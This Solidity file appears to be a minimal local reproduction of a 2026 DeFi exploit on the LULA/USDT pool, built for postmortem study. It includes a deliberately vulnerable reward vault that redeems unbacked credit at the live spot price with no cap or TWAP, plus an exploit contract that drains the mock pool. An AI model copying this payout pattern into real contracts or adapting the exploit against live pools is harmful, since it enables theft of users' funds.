// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal reproduction of the LULA reward-recycle self-drain (BSC,
// 2026-07). ~578,295 USDT drained from the LULA/USDT PancakeSwap pair in one tx.
// Basis: DeFiHackLabs PR #1209 (src/test/2026-07/LULA_exp.sol — a fork replay of
// the deployed helper).
//
// Root cause (reconstructed from the PoC header + trace; LULA source not
// byte-verbatim):
//   Weeks before the drain the attacker accumulated referral/team "reward" credit
//   inside LULA's reward bookkeeping (~12 days prior, in earlier txs). LULA's reward
//   payout redeems that credit by SELLING the credited LULA into the LULA/USDT pair
//   for USDT — priced at the pair's live spot, with no cap and no TWAP. Because the
//   pre-accumulated reward is large and unbacked, redeeming it against the pool pays
//   out far more USDT than was ever deposited, draining the pair. (In the live tx the
//   attacker also flash-loaned USDT to sweep LULA out of the pair first, maximising
//   the pool's deflation and the payout — an amplifier modelled by the pre-set
//   reward size here.) Every step is a public function driven by attacker-controlled
//   on-chain state — no owner key, no privileged signer.
// Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
}

contract MiniERC20 is IERC20 {
    string public name; string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}

// Minimal constant-product LULA/USDT pair (0.25% fee).
contract Pair {
    IERC20 public lula;
    IERC20 public usdt;
    uint256 public rLula;
    uint256 public rUsdt;
    constructor(IERC20 _lula, IERC20 _usdt) { lula = _lula; usdt = _usdt; }
    function seed(uint256 l, uint256 u) external { rLula = l; rUsdt = u; }
    // Sell `lulaIn` LULA into the pair; pay `usdtOut` to `to`.
    function swapLulaForUsdt(uint256 lulaIn, address to) external returns (uint256 usdtOut) {
        uint256 inFee = lulaIn * 9975;
        usdtOut = (inFee * rUsdt) / (rLula * 10000 + inFee);
        rLula += lulaIn;
        rUsdt -= usdtOut;
        usdt.transfer(to, usdtOut);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE LULA reward vault — redeems a pre-accumulated reward credit by
// selling the credited LULA into the pair for USDT at the live spot, no cap/TWAP.
// ─────────────────────────────────────────────────────────────────────────────
contract LulaReward {
    IERC20 public lula;
    Pair public pair;
    mapping(address => uint256) public rewardLula; // pre-accumulated (referral/team) reward credit, in LULA

    constructor(IERC20 _lula, Pair _pair) { lula = _lula; pair = _pair; }

    // Setup helper standing in for the ~12 days of prior referral/team accrual.
    function seedReward(address user, uint256 amount) external { rewardLula[user] = amount; }

    // @> VULN: redeems the (free, pre-accumulated) reward by dumping the credited
    // LULA into the pair for USDT at the manipulable live spot — no cap, no TWAP —
    // so an oversized unbacked credit drains the pair's USDT reserve.
    function claimReward() external returns (uint256 usdtOut) {
        uint256 amount = rewardLula[msg.sender];
        rewardLula[msg.sender] = 0;
        usdtOut = pair.swapLulaForUsdt(amount, msg.sender); // @> VULN: unbacked reward LULA sold into the pool with no cap/TWAP
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: redeem the pre-accumulated reward against the pool, draining
// its USDT.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    uint256 internal constant POOL_LULA = 600000e18;   // LULA/USDT pair reserves (pre-attack)
    uint256 internal constant POOL_USDT = 600000e18;
    uint256 internal constant REWARD_LULA = 22000000e18; // ~12-day pre-accumulated free reward credit

    MiniERC20 public lula;    // n1
    MiniERC20 public usdt;    // n2 (profit token)
    Pair public pair;         // n3
    LulaReward public reward; // n4 (VULN)

    uint256 public drained;
    uint256 public profit;

    constructor() {
        lula = new MiniERC20("LULA", "LULA"); // n1
        usdt = new MiniERC20("Tether USD", "USDT"); // n2
        pair = new Pair(IERC20(address(lula)), IERC20(address(usdt))); // n3
        reward = new LulaReward(IERC20(address(lula)), pair); // n4

        pair.seed(POOL_LULA, POOL_USDT);
        usdt.mint(address(pair), POOL_USDT); // real USDT backing the pair reserve

        // ~12 days of prior referral/team accrual credited to the attacker (free).
        reward.seedReward(address(this), REWARD_LULA);
    }

    function run() external {
        uint256 before = usdt.balanceOf(address(this));

        // Redeem the pre-accumulated reward: it dumps the free reward LULA into the
        // pair for USDT at the live spot, draining the pool.
        reward.claimReward();

        uint256 got = usdt.balanceOf(address(this));
        drained = got - before;
        profit = drained;
        require(profit >= 578000e18, "drain below ~578K USDT");
    }
}
